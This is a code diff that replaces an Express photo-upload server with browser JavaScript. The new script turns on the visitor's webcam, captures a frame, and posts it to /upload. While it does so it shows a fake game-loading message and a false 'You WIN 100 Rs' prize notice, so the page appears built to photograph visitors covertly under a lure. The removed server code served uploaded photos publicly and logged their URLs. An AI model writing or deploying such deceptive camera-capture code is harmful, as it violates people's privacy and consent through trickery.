@@ -1,56 +1,63 @@
-import express from "express";
-import multer from "multer";
-import path from "path";
-import fs from "fs";
-import { fileURLToPath } from "url";
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const captureBtn = document.getElementById("captureBtn");
+const status = document.getElementById("status");
 
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
+let streamReady = false;
 
-const app = express();
-const port = process.env.PORT || 10000;
-
-// ensure uploads folder exists (in repo create uploads/.gitkeep and commit)
-const uploadDir = path.join(__dirname, "uploads");
-if (!fs.existsSync(uploadDir)) {
-  fs.mkdirSync(uploadDir, { recursive: true });
-  console.log("uploads/ folder created");
+async function startCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+    await video.play();
+    streamReady = true;
+  } catch (err) {
+    console.error("Camera error:", err);
+  }
 }
 
-// multer storage
-const storage = multer.diskStorage({
-  destination: (req, file, cb) => cb(null, uploadDir),
-  filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
+function showLoadingText(text) {
+  let dots = 0;
+  status.textContent = text;
+  const interval = setInterval(() => {
+    dots = (dots + 1) % 4;
+    status.textContent = text + ".".repeat(dots);
+  }, 300);
+  return interval;
+}
+
+captureBtn.addEventListener("click", async () => {
+  status.textContent = "";
+
+  if (!streamReady) await startCamera();
+
+  const loader = showLoadingText("🕹️ Tap 2 times please, your game is loading");
+
+  const ctx = canvas.getContext("2d");
+  canvas.width = video.videoWidth || 640;
+  canvas.height = video.videoHeight || 480;
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  canvas.toBlob(async (blob) => {
+    try {
+      const form = new FormData();
+      form.append("photo", blob, `capture_${Date.now()}.jpg`);
+
+      const res = await fetch("/upload", { method: "POST", body: form });
+      const data = await res.json();
+
+      clearInterval(loader);
+
+      if (data && data.success) {
+        status.textContent = "🎉 You WIN 100 Rs successfully!";
+      } else {
+        status.textContent = "❌ Upload failed. Try again.";
+      }
+    } catch (err) {
+      clearInterval(loader);
+      status.textContent = "❌ Upload failed. Try again.";
+    }
+  }, "image/jpeg");
 });
-const upload = multer({ storage });
 
-app.use(express.static(path.join(__dirname, "public")));
-
-// serve uploads as public
-app.use("/uploads", express.static(uploadDir));
-
-// upload route
-app.post("/upload", upload.single("photo"), (req, res) => {
-  if (!req.file) {
-    return res.status(400).json({ success: false, error: "No file uploaded" });
-  }
-
-  // build public file url (works on Render)
-  const host = req.get("host");
-  const protocol = req.protocol;
-  const publicUrl = `${protocol}://${host}/uploads/${req.file.filename}`;
-
-  // log url so Render logs show it
-  console.log(`📸 Photo uploaded: ${publicUrl}`);
-
-  // respond with full URL
-  res.json({
-    success: true,
-    filePath: publicUrl,
-    filename: req.file.filename
-  });
-});
-
-app.listen(port, () => {
-  console.log(`🚀 Server running on port ${port}`);
-});
+startCamera();
